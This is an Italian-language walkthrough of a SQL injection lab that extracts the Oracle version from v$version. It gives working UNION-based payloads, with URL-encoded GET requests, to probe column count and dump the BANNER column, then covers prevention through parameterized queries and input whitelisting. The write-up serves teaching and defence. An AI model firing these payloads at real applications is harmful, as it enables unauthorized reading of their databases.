## 1. Contesto e obiettivo della sfida

Questa applicazione ha una pagina che mostra i prodotti in base a una “categoria” selezionata dall’utente. Dietro le quinte, il server esegue una query SQL simile a questa:

```
SELECT column1, column2
FROM products
WHERE category = 'VALORE_SCELTO'
  AND released = 1;
```

* **column1** e **column2** sono due colonne di tipo testo (ad esempio “nome” e “descrizione”) che l’app restituisce per ogni prodotto.
* **category = '…'** filtra i prodotti per categoria.
* **released = 1** mostra solo prodotti già “rilasciati”.

Il lab è vulnerabile a SQL injection nella parte `category = '…'`: possiamo iniettare un payload UNION per combinare i risultati originali con quelli di una nostra query arbitraria. L’obiettivo finale è far apparire la **versione del database Oracle** (che si trova nella vista `v$version`).

---

## 2. Individuare il numero di colonne e il tipo di dati

Per costruire correttamente un attacco `UNION SELECT`, dobbiamo conoscere:

1. **Quante colonne** restituisce la query originale (deve corrispondere al numero di colonne nella nostra SELECT iniettata).
2. **Quali colonne sono di tipo testo** (perché solo le colonne testuali possono mostrare stringhe come la versione di Oracle).

### 2.1. Test preliminare con un payload di controllo

1. Intercetta la richiesta HTTP (ad esempio con Burp Suite) quando selezioni una categoria qualsiasi. Di solito la richiesta appare come:

   ```
   GET /filter?category=Gifts HTTP/1.1
   Host: vlab-oracle
   ...
   ```

2. Modifica il parametro `category` inserendo un payload di prova che cerca di fare UNION con due stringhe “abc” e “def”:

   ```
   ' UNION SELECT 'abc','def' FROM dual--
   ```

   (con l’URL encoded diventa:
   `category=%27+UNION+SELECT+%27abc%27,%27def%27+FROM+dual--`)

3. Inviando questa richiesta, se la pagina mostra “abc” e “def”, significa due cose:

   * Il numero di colonne è **2** (perché UNION SELECT fornisce due colonne).
   * Entrambe le colonne sono di tipo testo (possiamo iniettarvi stringhe).

Se invece si riceve errore di tipo “conteggio colonne non corrisponde” o “tipo di dato non valido”, bisognerebbe aggiustare il numero di colonne o l’encoding, ma nel nostro lab è già noto che sono **due** e **testo**.

---

## 3. Costruire il payload per ottenere la versione del database

Ora sappiamo che la query originale è, idealmente:

```
SELECT col1, col2
FROM products
WHERE category = '[VALORE_INIETTATO]'
  AND released = 1;
```

Per iniettare il nostro UNION, sostituiamo `category` con il payload:

```
' UNION SELECT BANNER, NULL FROM v$version--
```

* **BANNER** è la colonna che contiene la stringa della versione completa (tipo “Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production”).
* Mettiamo `NULL` come secondo valore perché la query originale restituisce due colonne e la seconda colonna ci serve solamente per tenere lo stesso numero di colonne.
* Il `--` trasforma in commento tutto ciò che segue, quindi “AND released = 1” verrà ignorato.

### 3.1. Versione URL-encoded

Per utilizzarlo in un browser (o in Burp), l’URL diventa:

```
GET /filter?category=%27+UNION+SELECT+BANNER,+NULL+FROM+v%24version-- HTTP/1.1
Host: vlab-oracle
...
```

Spiegazione degli encoding:

* `%27` è l’apice singolo (`'`).
* Lo spazio diventa `+` o `%20`.
* `v$version` diventa `v%24version` perché `$` è codificato come `%24`.
* `--` rimane semplicemente due trattini.

---

## 4. Cosa succede nel database

Quando il server riceve il parametro `category = ' UNION SELECT BANNER, NULL FROM v$version--`, costruisce internamente la query così:

```
SELECT col1, col2
FROM products
WHERE category = ''
  UNION
SELECT BANNER, NULL
FROM v$version
--' AND released = 1
```

Vediamo i dettagli:

1. **category = ''**: la stringa vuota è il risultato di chiudere subito l’apice.
2. **UNION SELECT BANNER, NULL FROM v\$version**: questa parte combina i risultati della prima query (che probabilmente non restituisce righe, perché category = '') con quelli di `SELECT BANNER, NULL FROM v$version`.
3. **--** commenta tutto ciò che segue, quindi `AND released = 1` non viene eseguito.

Di conseguenza, il risultato restituito dall’app mostrerà i valori della vista `v$version`: in particolare tutte le righe di `v$version`, ma la colonna `BANNER` contiene almeno una riga con la stringa “Oracle Database XXc Release YY.ZZ.ZZ...” che è proprio quello che cerchiamo.

---

## 5. Verifica del successo

* Dopo aver inviato l’URL modificato, la pagina di risultati dei prodotti mostrerà, in cima (o in mezzo), una riga il cui “nome” (o campo testuale) corrisponde a qualcosa come:

  ```
  Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production
  ```

  oppure un’altra versione a seconda dell’ambiente del lab.
* Questo conferma che l’UNION ha funzionato ed è stato eseguito **SELECT BANNER**, prelevando la stringa della versione di Oracle.

---

## 6. Come prevenire questo tipo di vulnerabilità

Per impedire questo attacco, nella sezione “category” (o in qualsiasi input che finisce in una query SQL) bisogna:

1. **Usare query parametrizzate** (Prepared Statements)

   * In qualunque linguaggio server-side (Java, PHP, Python, .NET…), non concatenare mai l’input dell’utente dentro la stringa SQL.
   * Esempio in pseudocodice:

     ```pseudo
     stmt = db.prepare("SELECT col1, col2 FROM products WHERE category = ? AND released = 1");
     stmt.bind(0, category_input);
     result = stmt.execute();
     ```
   * In questo modo, anche se un utente passa ` ' UNION SELECT ...`, il database lo tratta come semplice stringa e non come parte della query.

2. **Validare/filtrare i valori ammessi**

   * Se sappiamo a priori che “category” può essere solo uno di un elenco limitato (es. “Books”, “Electronics”, “Toys”), basterebbe verificare che `category_input` corrisponda esattamente a uno di quei valori.
   * Se non corrisponde, restituisci un errore o reindirizza a una pagina di errore, senza eseguire la query SQL.

3. **Usare funzioni di escape SQL**

   * Se proprio non è possibile usare i Prepared Statements, occorre almeno fare escaping della stringa (ad esempio raddoppiare ogni apice singolo: `'` → `''`). Anche così, però, è più facile commettere errori e per questo motivo **i Prepared Statements rimangono la difesa più solida**.

---

## 7. Riepilogo finale

1. **Identificare** che la query ha 2 colonne di tipo testo (\[col1, col2]).
2. **Testare** con un payload di prova (`' UNION SELECT 'abc','def' FROM dual--`) per verificare numero di colonne e tipo.
3. **Iniettare** il payload definitivo:

   ```
   ' UNION SELECT BANNER,NULL FROM v$version--
   ```

   (URL-encoded: `%27+UNION+SELECT+BANNER,+NULL+FROM+v%24version--`)
4. **Osservare** che la pagina mostra la stringa di versione Oracle (prelevata da `v$version`).
5. **Capire** la contromisura: query parametrizzate o whitelist delle categorie.
